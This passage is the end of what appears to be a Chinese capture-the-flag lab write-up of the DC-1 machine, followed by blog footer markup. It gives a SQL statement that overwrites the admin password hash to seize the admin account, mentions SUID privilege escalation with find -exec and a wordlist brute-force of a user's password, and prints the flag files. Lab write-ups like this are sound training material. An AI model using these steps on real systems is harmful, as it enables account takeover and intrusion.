+<p><code>update users set pass=&quot;$S$D2eeWaoZxfsSVPNGShv9y7333O21Iyhol/NvU93UXfq4/gLv9gTx&quot; where name=&quot;admin&quot;</code></p>
+<p>到网页端登录 admin&#x2F;123456点击find content下面有flag3提示我们使用-exec提权，即前面的suid提权<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060706108.png"></p>
+<p>在根目录下查找到flag4和thefinalflag<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060717908.png"></p>
+<p>由于现在是root权限，直接读取即可，内容分别是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line">您可以使用相同的方法来查找或访问 root 中的标志吗？</span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br><span class="line">可能。但也许这并不容易。或者也许是这样？</span><br><span class="line"></span><br><span class="line">#thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line">干的好！！！！</span><br><span class="line">能。</span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new ski</span><br><span class="line">希望您喜欢这个并学到了一些新技lls.</span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCCAU7</span><br><span class="line">您可以让我知道您对这次小旅程的看法</span><br><span class="line">通过 Twitter 与我联系 - @DCCAU7</span><br></pre></td></tr></table></figure>
+
+<p>这里用kali自带的字典爆破出了flag4用户的密码为orange(虽然没什么用)<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060735659.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E9%A2%98%E5%A4%96%E8%AF%9D%EF%BC%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">0.题外话，虚拟机网络设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%A7%8B"><span class="toc-number">2.</span> <span class="toc-text">1.正式开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">2.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%9B%AE%E6%A0%87%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">3.目标渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">4.权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E5%AF%BB%E6%89%BE"><span class="toc-number">6.</span> <span class="toc-text">flag寻找</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&text=靶场实战  DC"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&is_video=false&description=靶场实战  DC"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶场实战  DC&body=Check out this article: https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&title=靶场实战  DC"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&name=靶场实战  DC&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2025/04/25/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98DC/&t=靶场实战  DC"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    ta3shi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
